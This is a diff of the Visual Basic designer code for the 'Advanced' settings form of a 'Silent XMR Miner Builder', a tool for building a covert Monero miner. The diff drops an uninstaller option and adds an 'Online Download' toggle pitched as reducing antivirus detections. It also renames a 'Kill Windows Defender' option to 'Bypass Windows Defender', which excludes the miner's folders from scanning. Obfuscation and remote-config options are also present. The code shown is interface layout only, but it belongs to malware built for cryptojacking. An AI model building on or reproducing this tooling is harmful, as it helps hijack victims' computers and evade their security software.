@@ -30,9 +30,11 @@ Partial Class Advanced
         Me.Label1 = New System.Windows.Forms.Label()
         Me.Label3 = New System.Windows.Forms.Label()
         Me.Label6 = New System.Windows.Forms.Label()
-        Me.Label7 = New System.Windows.Forms.Label()
         Me.Label9 = New System.Windows.Forms.Label()
+        Me.Label11 = New System.Windows.Forms.Label()
         Me.MephTheme1 = New SilentXMRMiner.MephTheme()
+        Me.Label12 = New System.Windows.Forms.Label()
+        Me.toggleDownloader = New SilentXMRMiner.MephToggleSwitch()
         Me.Label10 = New System.Windows.Forms.Label()
         Me.toggleAdministrator = New SilentXMRMiner.MephToggleSwitch()
         Me.PictureBox1 = New System.Windows.Forms.PictureBox()
@@ -48,8 +50,6 @@ Partial Class Advanced
         Me.Label5 = New System.Windows.Forms.Label()
         Me.chkRemoteConfig = New SilentXMRMiner.MephCheckBox()
         Me.txtRemoteConfig = New SilentXMRMiner.MephTextBox()
-        Me.Label8 = New System.Windows.Forms.Label()
-        Me.toggleUninstaller = New SilentXMRMiner.MephToggleSwitch()
         Me.MephTheme1.SuspendLayout()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.SuspendLayout()
@@ -113,13 +113,14 @@ Partial Class Advanced
         Me.Label3.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label3.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label3.ForeColor = System.Drawing.Color.Teal
-        Me.Label3.Location = New System.Drawing.Point(160, 253)
+        Me.Label3.Location = New System.Drawing.Point(173, 168)
         Me.Label3.Name = "Label3"
         Me.Label3.Size = New System.Drawing.Size(13, 13)
         Me.Label3.TabIndex = 73
         Me.Label3.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label3, "Will run commands to try and ""kill"" Windows Defender when the miner loader is sta" &
-        "rted. " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This command requires Administrator privileges!")
+        Me.TooltipHelper.SetToolTip(Me.Label3, "Will run commands to exclude the general folders that the miner uses or can use. " &
+        "This is good to enable to bypass future detections." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This command requires Admin" &
+        "istrator privileges!")
         '
         'Label6
         '
@@ -135,21 +136,6 @@ Partial Class Advanced
         Me.Label6.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label6, resources.GetString("Label6.ToolTip"))
         '
-        'Label7
-        '
-        Me.Label7.AutoSize = True
-        Me.Label7.BackColor = System.Drawing.Color.Transparent
-        Me.Label7.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label7.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label7.ForeColor = System.Drawing.Color.Teal
-        Me.Label7.Location = New System.Drawing.Point(121, 107)
-        Me.Label7.Name = "Label7"
-        Me.Label7.Size = New System.Drawing.Size(13, 13)
-        Me.Label7.TabIndex = 80
-        Me.Label7.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label7, "Creates an uninstaller in the same location as the miner that can be used to clos" &
-        "e the miner or fully remove/revert any changes made by it." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10))
-        '
         'Label9
         '
         Me.Label9.AutoSize = True
@@ -157,20 +143,39 @@ Partial Class Advanced
         Me.Label9.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label9.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label9.ForeColor = System.Drawing.Color.Teal
-        Me.Label9.Location = New System.Drawing.Point(140, 136)
+        Me.Label9.Location = New System.Drawing.Point(140, 138)
         Me.Label9.Name = "Label9"
         Me.Label9.Size = New System.Drawing.Size(13, 13)
         Me.Label9.TabIndex = 84
         Me.Label9.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label9, "Will make the miner ask for administrator privileges to run." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This is required fo" &
-        "r the ""Kill"" Windows Defender option. This option will also increase the hashrat" &
+        "r the Bypass Windows Defender option. This option will also increase the hashrat" &
         "e.")
+        '
+        'Label11
+        '
+        Me.Label11.AutoSize = True
+        Me.Label11.BackColor = System.Drawing.Color.Transparent
+        Me.Label11.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label11.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label11.ForeColor = System.Drawing.Color.Teal
+        Me.Label11.Location = New System.Drawing.Point(119, 108)
+        Me.Label11.Name = "Label11"
+        Me.Label11.Size = New System.Drawing.Size(13, 13)
+        Me.Label11.TabIndex = 87
+        Me.Label11.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label11, "Enable this to download the miner from online (GitHub) instead of embedding it in" &
+        " the file." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This will greatly decrease the file size and usually greatly decreas" &
+        "es detections.")
         '
         'MephTheme1
         '
         Me.MephTheme1.AccentColor = System.Drawing.Color.DarkRed
         Me.MephTheme1.Anchor = System.Windows.Forms.AnchorStyles.None
         Me.MephTheme1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
+        Me.MephTheme1.Controls.Add(Me.Label11)
+        Me.MephTheme1.Controls.Add(Me.Label12)
+        Me.MephTheme1.Controls.Add(Me.toggleDownloader)
         Me.MephTheme1.Controls.Add(Me.Label9)
         Me.MephTheme1.Controls.Add(Me.Label10)
         Me.MephTheme1.Controls.Add(Me.toggleAdministrator)
@@ -192,9 +197,6 @@ Partial Class Advanced
         Me.MephTheme1.Controls.Add(Me.Label6)
         Me.MephTheme1.Controls.Add(Me.chkRemoteConfig)
         Me.MephTheme1.Controls.Add(Me.txtRemoteConfig)
-        Me.MephTheme1.Controls.Add(Me.Label7)
-        Me.MephTheme1.Controls.Add(Me.Label8)
-        Me.MephTheme1.Controls.Add(Me.toggleUninstaller)
         Me.MephTheme1.Font = New System.Drawing.Font("Segoe UI", 9.5!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(128, Byte))
         Me.MephTheme1.Location = New System.Drawing.Point(0, 0)
         Me.MephTheme1.Name = "MephTheme1"
@@ -203,13 +205,38 @@ Partial Class Advanced
         Me.MephTheme1.TabIndex = 0
         Me.MephTheme1.Text = "Silent XMR Miner Builder"
         '
+        'Label12
+        '
+        Me.Label12.AutoSize = True
+        Me.Label12.BackColor = System.Drawing.Color.Transparent
+        Me.Label12.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label12.ForeColor = System.Drawing.Color.Gray
+        Me.Label12.Location = New System.Drawing.Point(11, 105)
+        Me.Label12.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label12.Name = "Label12"
+        Me.Label12.Size = New System.Drawing.Size(111, 17)
+        Me.Label12.TabIndex = 86
+        Me.Label12.Text = "Online Download:"
+        '
+        'toggleDownloader
+        '
+        Me.toggleDownloader.BackColor = System.Drawing.Color.Transparent
+        Me.toggleDownloader.Checked = True
+        Me.toggleDownloader.ForeColor = System.Drawing.Color.Black
+        Me.toggleDownloader.Location = New System.Drawing.Point(190, 103)
+        Me.toggleDownloader.Margin = New System.Windows.Forms.Padding(2)
+        Me.toggleDownloader.Name = "toggleDownloader"
+        Me.toggleDownloader.Size = New System.Drawing.Size(50, 24)
+        Me.toggleDownloader.TabIndex = 85
+        Me.toggleDownloader.Text = "Enable Nicehash Mining"
+        '
         'Label10
         '
         Me.Label10.AutoSize = True
         Me.Label10.BackColor = System.Drawing.Color.Transparent
         Me.Label10.Font = New System.Drawing.Font("Segoe UI", 9.5!)
         Me.Label10.ForeColor = System.Drawing.Color.Gray
-        Me.Label10.Location = New System.Drawing.Point(11, 133)
+        Me.Label10.Location = New System.Drawing.Point(11, 135)
         Me.Label10.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label10.Name = "Label10"
         Me.Label10.Size = New System.Drawing.Size(133, 17)
@@ -221,7 +248,7 @@ Partial Class Advanced
         Me.toggleAdministrator.BackColor = System.Drawing.Color.Transparent
         Me.toggleAdministrator.Checked = False
         Me.toggleAdministrator.ForeColor = System.Drawing.Color.Black
-        Me.toggleAdministrator.Location = New System.Drawing.Point(163, 131)
+        Me.toggleAdministrator.Location = New System.Drawing.Point(190, 133)
         Me.toggleAdministrator.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleAdministrator.Name = "toggleAdministrator"
         Me.toggleAdministrator.Size = New System.Drawing.Size(50, 24)
@@ -232,7 +259,7 @@ Partial Class Advanced
         '
         Me.PictureBox1.BackColor = System.Drawing.Color.Transparent
         Me.PictureBox1.Image = Global.SilentXMRMiner.My.Resources.Resources.microsoft_admin
-        Me.PictureBox1.Location = New System.Drawing.Point(228, 251)
+        Me.PictureBox1.Location = New System.Drawing.Point(243, 166)
         Me.PictureBox1.Name = "PictureBox1"
         Me.PictureBox1.Size = New System.Drawing.Size(20, 20)
         Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
@@ -324,7 +351,7 @@ Partial Class Advanced
         Me.toggleObfuscation.BackColor = System.Drawing.Color.Transparent
         Me.toggleObfuscation.Checked = False
         Me.toggleObfuscation.ForeColor = System.Drawing.Color.Black
-        Me.toggleObfuscation.Location = New System.Drawing.Point(162, 73)
+        Me.toggleObfuscation.Location = New System.Drawing.Point(189, 73)
         Me.toggleObfuscation.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleObfuscation.Name = "toggleObfuscation"
         Me.toggleObfuscation.Size = New System.Drawing.Size(50, 24)
@@ -336,20 +363,20 @@ Partial Class Advanced
         Me.Label4.AutoSize = True
         Me.Label4.BackColor = System.Drawing.Color.Transparent
         Me.Label4.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
-        Me.Label4.Location = New System.Drawing.Point(11, 250)
+        Me.Label4.ForeColor = System.Drawing.Color.Gray
+        Me.Label4.Location = New System.Drawing.Point(11, 165)
         Me.Label4.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label4.Name = "Label4"
-        Me.Label4.Size = New System.Drawing.Size(153, 17)
+        Me.Label4.Size = New System.Drawing.Size(166, 17)
         Me.Label4.TabIndex = 72
-        Me.Label4.Text = """Kill"" Windows Defender:"
+        Me.Label4.Text = "Bypass Windows Defender:"
         '
         'toggleKillWD
         '
         Me.toggleKillWD.BackColor = System.Drawing.Color.Transparent
         Me.toggleKillWD.Checked = False
         Me.toggleKillWD.ForeColor = System.Drawing.Color.Black
-        Me.toggleKillWD.Location = New System.Drawing.Point(175, 248)
+        Me.toggleKillWD.Location = New System.Drawing.Point(190, 163)
         Me.toggleKillWD.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleKillWD.Name = "toggleKillWD"
         Me.toggleKillWD.Size = New System.Drawing.Size(50, 24)
@@ -398,31 +425,6 @@ Partial Class Advanced
         Me.txtRemoteConfig.UseSystemPasswordChar = False
         Me.txtRemoteConfig.WordWrap = False
         '
-        'Label8
-        '
-        Me.Label8.AutoSize = True
-        Me.Label8.BackColor = System.Drawing.Color.Transparent
-        Me.Label8.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label8.ForeColor = System.Drawing.Color.Gray
-        Me.Label8.Location = New System.Drawing.Point(11, 104)
-        Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
-        Me.Label8.Name = "Label8"
-        Me.Label8.Size = New System.Drawing.Size(114, 17)
-        Me.Label8.TabIndex = 79
-        Me.Label8.Text = "Create Uninstaller:"
-        '
-        'toggleUninstaller
-        '
-        Me.toggleUninstaller.BackColor = System.Drawing.Color.Transparent
-        Me.toggleUninstaller.Checked = True
-        Me.toggleUninstaller.ForeColor = System.Drawing.Color.Black
-        Me.toggleUninstaller.Location = New System.Drawing.Point(163, 102)
-        Me.toggleUninstaller.Margin = New System.Windows.Forms.Padding(2)
-        Me.toggleUninstaller.Name = "toggleUninstaller"
-        Me.toggleUninstaller.Size = New System.Drawing.Size(50, 24)
-        Me.toggleUninstaller.TabIndex = 78
-        Me.toggleUninstaller.Text = "Enable Nicehash Mining"
-        '
         'Advanced
         '
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None
@@ -466,11 +468,11 @@ Partial Class Advanced
     Friend WithEvents Label6 As Label
     Friend WithEvents chkRemoteConfig As MephCheckBox
     Friend WithEvents txtRemoteConfig As MephTextBox
-    Friend WithEvents Label7 As Label
-    Friend WithEvents Label8 As Label
-    Friend WithEvents toggleUninstaller As MephToggleSwitch
     Friend WithEvents PictureBox1 As PictureBox
     Friend WithEvents Label9 As Label
     Friend WithEvents Label10 As Label
     Friend WithEvents toggleAdministrator As MephToggleSwitch
+    Friend WithEvents Label11 As Label
+    Friend WithEvents Label12 As Label
+    Friend WithEvents toggleDownloader As MephToggleSwitch
 End Class
